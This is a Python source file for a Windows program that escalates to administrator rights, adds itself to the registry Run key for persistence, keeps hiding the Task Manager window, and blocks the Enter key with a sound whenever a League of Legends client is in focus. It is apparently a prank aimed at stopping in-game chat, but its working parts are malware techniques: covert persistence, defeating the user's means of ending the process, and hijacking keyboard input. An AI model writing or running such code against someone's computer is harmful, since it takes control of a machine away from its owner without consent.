import threading
import functools
import playsound
import keyboard
import win32gui
import win32con
import win32api
import platform
import winreg
import ctypes
import time
import sys
import os

PRODUCTION = getattr(sys, 'frozen', False)
ROOT = os.path.abspath(__file__)

if PRODUCTION:
    head, _ = os.path.splitext(ROOT)
    ROOT = f'{head}.exe'

NAME, _ = os.path.splitext(os.path.basename(__file__))
ROOT_DIR = os.path.dirname(ROOT)

class Wrap:

    @staticmethod
    def error_alert(err_title, err_desc):
        def decorator(callback):
            @functools.wraps(callback)
            def wrapper(*args, **kwargs):
                try:
                    return callback(*args, **kwargs)
                except Exception:
                    win32api.MessageBox(None,
                                        err_desc,
                                        err_title,
                                        win32con.MB_ICONERROR)
                    sys.exit(1)

            return wrapper

        return decorator

    @staticmethod
    def thread_kill(callback):
        def wrapper(*args, **kwargs):
            try:
                return callback(*args, **kwargs)
            except Exception:
                sys.exit(1)
        
        return wrapper

    @staticmethod
    def thread_call(callback):
        def wrapper(*args, **kwargs):
            threading.Thread(target=callback,
                             args=args,
                             kwargs=kwargs,
                             daemon=True).start()

        return wrapper

class Check:

    @staticmethod
    def is_windows():
        os = platform.system()

        if os != 'Windows':
            sys.exit(1)

    @staticmethod
    @Wrap.error_alert('Administrator Privileges Required',
                      'Please try running the program again and\n'
                      'make sure to have administrator privileges.')
    def is_admin():
        admin = ctypes.windll.shell32.IsUserAnAdmin()

        if admin != 1:
            if PRODUCTION:
                ctypes.windll.shell32.ShellExecuteW(None,
                                                    'runas',
                                                    sys.executable,
                                                    ' '.join(sys.argv),
                                                    None,
                                                    None)
                sys.exit(0)
            else:
                raise OSError

class Persistence:

    _REG_KEY = r'Software\Microsoft\Windows\CurrentVersion\Run'

    @staticmethod
    def registry():
        reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)

        with winreg.OpenKey(reg,
                            Persistence._REG_KEY,
                            0,
                            winreg.KEY_ALL_ACCESS) as key:
            winreg.SetValueEx(key, NAME, 0, winreg.REG_EXPAND_SZ, ROOT)

class Window:

    _TASKMGR = r'C:\Windows\System32\Taskmgr.exe'
    _SUB_BLOCK_LOCALE = r'\VarFileInfo\Translation'
    _SUB_BLOCK_TITLE = r'\StringFileInfo\{:04X}{:04X}\FileDescription'

    def __init__(self, *, interval=1):
        self.interval = interval

    @Wrap.thread_call
    def hide(self, window_title):
        while True:
            window = win32gui.FindWindow(None, window_title)
            win32gui.ShowWindow(window, win32con.SW_HIDE)
            time.sleep(self.interval)

    @Wrap.error_alert('Invalid Task Manager Filepath',
                      'Please try running the program again and make\n'
                      'sure to specify a valid executable filepath.')
    def taskmgr_title(self):
        (language, code), *_ = win32api.GetFileVersionInfo(self._TASKMGR, self._SUB_BLOCK_LOCALE)
        sub_block_title = self._SUB_BLOCK_TITLE.format(language, code)
        title = win32api.GetFileVersionInfo(self._TASKMGR, sub_block_title)
        return title

class Supress:

    _BLOCKED_WINDOWS = ('League of Legends (TM) Client',)
    _SUPRESSED_KEYS = ('enter',)
    _SOUND_FILENAME = (lambda filename:
                          os.path.join(sys._MEIPASS, filename) if PRODUCTION
                          else os.path.join(ROOT_DIR, filename))('KEKW.mp3')

    def run(self):
        self._event_loop()
        keyboard.wait()

    @Wrap.thread_call
    def _event_loop(self):
        hooked = False

        while True:
            if self._active_window() in self._BLOCKED_WINDOWS:
                if not hooked:
                    self._register_hooks()
                    hooked = True
            else:
                if hooked:
                    self._unregister_hooks()
                    hooked = False

            time.sleep(0.01)

    def _active_window(self):
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        return title

    def _register_hooks(self):
        for key in self._SUPRESSED_KEYS:
            keyboard.hook_key(key, self._hook_event, suppress=True)

    def _unregister_hooks(self):
        keyboard.unhook_all()

    def _hook_event(self, event):
        if event.event_type == 'down':
            self._play_sound()

    @Wrap.thread_call
    @Wrap.thread_kill
    def _play_sound(self):
        playsound.playsound(self._SOUND_FILENAME)

if __name__ == '__main__':
    Check.is_windows()
    Check.is_admin()
    Persistence.registry()
    window = Window()
    window_title = window.taskmgr_title()
    window.hide(window_title)
    Supress().run()
